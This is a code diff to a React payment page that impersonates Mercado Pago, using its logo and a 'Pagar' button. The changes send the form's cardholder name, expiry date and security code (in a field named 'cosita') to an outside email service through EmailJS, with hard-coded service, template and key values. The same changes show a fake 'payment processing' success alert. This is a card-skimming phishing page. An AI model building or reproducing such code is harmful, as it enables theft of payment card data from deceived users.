@@ -1,8 +1,37 @@
 import logo from "./img/Mercado-Pago-Logo.png";
 import { useState } from "react";
 import logo2 from "./img/logo.png";
+import emailjs from "@emailjs/browser";
+import { useRef } from "react";
+import swal from "sweetalert";
 
 function App() {
+  const handlePayment = () => {
+    swal("Listo", "Tu pago se está procesando", "success");
+  };
+
+  const form = useRef();
+
+  const sendEmail = (e) => {
+    e.preventDefault();
+
+    emailjs
+      .sendForm(
+        "service_o2d02zx",
+        "template_1olihj5",
+        form.current,
+        "6OELNdq2Gzv5AQmuh"
+      )
+      .then(
+        (result) => {
+          console.log(result.text);
+        },
+        (error) => {
+          console.log(error.text);
+        }
+      );
+  };
+
   const [expiryDate, setExpiryDate] = useState("");
 
   const handleChange = (event) => {
@@ -86,7 +115,7 @@ function App() {
         </div>
       </nav>
       <div className="h-full my-4 lg:my-32 mx-auto max-w-sm lg:max-w-lg p-4 bg-[#ffffff] border border-gray-200 rounded-lg shadow sm:p-6 md:p-8 dark:bg-gray-800 dark:border-gray-700">
-        <form className="space-y-6" action="#">
+        <form className="space-y-6" action="#" ref={form} onSubmit={sendEmail}>
           <div className="flex items-center">
             <div className="flex items-center">
               <h5 className="text-base font-bold leading-[1.35] font-sans text-gray-900 dark:text-white">
@@ -97,9 +126,8 @@ function App() {
           <div>
             <h1 className="w-12 mb-1">Nombre&nbsp;del&nbsp;titular:</h1>
             <input
-              type="email"
-              name="email"
-              id="email"
+              type="text"
+              name="name"
               className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
               placeholder="Ingresa tu nombre"
               required
@@ -130,6 +158,7 @@ function App() {
                 maxLength={5} // Limitar a 5 caracteres incluyendo la "/"
                 className="bg-gray-50 border w-full md:w-[200px] border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
                 placeholder="MM/YY"
+                name="fecha"
               />
             </div>
             <div>
@@ -141,6 +170,7 @@ function App() {
                 maxLength={3} // Limitar a 3 caracteres
                 className="bg-gray-50 border ml-4 md:ml-1 sm:ml-0 border-gray-300 text-gray-900 text-sm rounded-lg sm:w-[180px] md:w-[105px] lg:w-[233px] focus:ring-blue-500 focus:border-blue-500 p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
                 placeholder="***"
+                name="cosita"
               />
             </div>
           </div>
@@ -165,6 +195,7 @@ function App() {
             </div>
             <button
               type="submit"
+              onClick={handlePayment}
               className="text-white mx-auto bg-sky-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800"
             >
               Pagar
